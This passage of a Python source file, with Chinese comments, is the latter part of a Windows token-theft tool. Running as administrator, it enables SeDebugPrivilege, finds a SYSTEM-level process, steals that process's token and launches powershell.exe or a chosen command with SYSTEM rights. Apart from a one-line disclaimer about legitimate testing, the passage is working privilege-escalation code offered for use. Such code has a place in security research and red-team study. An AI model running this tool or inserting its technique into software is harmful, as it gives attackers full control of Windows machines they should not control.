            print(f"创建SYSTEM权限进程失败: {str(e)}")
            # 显示可能的解决方案
            print("\n可能的解决方案：")
            print("1. 确保您以管理员身份运行此程序")
            print("2. 检查系统安全策略是否允许此类操作")
            print("3. 某些安全软件可能会阻止令牌窃取操作")
            print("4. 在某些Windows版本或配置下，可能需要额外的权限")
            return False
    
    def _get_error_message(self, error_code):
        """获取Windows错误码对应的错误信息"""
        try:
            # 使用FormatMessage获取错误描述
            FORMAT_MESSAGE_FROM_SYSTEM = 0x00001000
            FORMAT_MESSAGE_IGNORE_INSERTS = 0x00000200
            
            # 初始化缓冲区
            buffer_size = 256
            buffer = ctypes.create_unicode_buffer(buffer_size)
            
            # 调用FormatMessage获取错误信息
            format_message(
                FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
                None,
                error_code,
                0,  # 语言ID (0表示默认语言)
                buffer,
                buffer_size,
                None
            )
            
            # 返回错误信息，去除首尾空白字符
            return buffer.value.strip()
        except:
            # 如果获取失败，返回默认信息
            return "未知错误"
    
    def check_current_privileges(self):
        """检查并显示当前进程的权限状态"""
        try:
            # 打开当前进程的令牌
            token_handle = wintypes.HANDLE()
            if not open_process_token(get_current_process(), TOKEN_QUERY, ctypes.byref(token_handle)):
                print(f"无法打开当前进程令牌: 错误码 {get_last_error()}")
                return False
            
            # 检查SeDebugPrivilege权限状态
            luid = LUID()
            if not lookup_privilege_value(None, SE_DEBUG_NAME, ctypes.byref(luid)):
                close_handle(token_handle)
                print(f"无法查找SeDebugPrivilege权限值: 错误码 {get_last_error()}")
                return False
            
            # 查询权限状态
            privilege = LUID_AND_ATTRIBUTES()
            privilege.Luid = luid
            
            token_privileges = TOKEN_PRIVILEGES()
            token_privileges.PrivilegeCount = 1
            token_privileges.Privileges[0] = privilege
            
            return_length = wintypes.DWORD()
            if not adjust_token_privileges(token_handle, False, ctypes.byref(token_privileges), ctypes.sizeof(TOKEN_PRIVILEGES), ctypes.byref(token_privileges), ctypes.byref(return_length)):
                close_handle(token_handle)
                print(f"无法查询权限状态: 错误码 {get_last_error()}")
                return False
            
            # 检查权限是否已启用
            is_enabled = (token_privileges.Privileges[0].Attributes & 0x00000002) != 0  # SE_PRIVILEGE_ENABLED
            
            print(f"当前进程权限状态:")
            print(f"  SeDebugPrivilege: {'已启用' if is_enabled else '未启用'}")
            
            close_handle(token_handle)
            return is_enabled
        except Exception as e:
            print(f"检查权限时发生错误: {str(e)}")
            return False
            
    def run(self, command="cmd.exe"):
        """运行令牌窃取工具的主流程"""
        print("=== 系统权限获取工具（令牌窃取）===")
        print("注意：此工具仅用于合法的安全测试和研究目的！\n")
        
        # 1. 检查并启用调试权限
        print("步骤 1: 启用调试权限...")
        if not self.enable_debug_privilege():
            print("警告: 无法启用调试权限，可能会影响工具功能。")
            # 显示当前权限状态，帮助排查问题
            print("\n当前进程实际权限状态:")
            self.check_current_privileges()
        
        # 2. 查找系统进程
        print("步骤 2: 查找具有SYSTEM权限的进程...")
        system_process_handle = self.find_system_process()
        if not system_process_handle:
            print("错误: 无法找到具有SYSTEM权限的进程。")
            return False
        print("成功找到系统进程。")
        
        # 3. 窃取令牌
        print("步骤 3: 从系统进程窃取令牌...")
        token_handle = self.steal_token(system_process_handle)
        if not token_handle:
            close_handle(system_process_handle)
            print("错误: 令牌窃取失败。")
            return False
        print("成功窃取SYSTEM令牌。")
        
        # 4. 创建SYSTEM权限进程
        print(f"步骤 4: 使用SYSTEM令牌创建进程 '{command}'...")
        result = self.create_system_process(token_handle, command)
        
        # 清理资源
        close_handle(token_handle)
        close_handle(system_process_handle)
        
        return result

if __name__ == "__main__":
    # 检查是否以管理员身份运行
    try:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        is_admin = False
    
    if not is_admin:
        print("警告: 此工具需要以管理员身份运行才能正常工作。")
        print("请使用'以管理员身份运行'选项重新启动此程序。")
        sys.exit(1)
    
    # 创建工具实例并运行
    tool = TokenTheftTool()
    
    # 处理命令行参数
    command = "powershell.exe"
    if len(sys.argv) > 1:
        command = sys.argv[1]
    
    # 运行令牌窃取过程
    tool.run(command)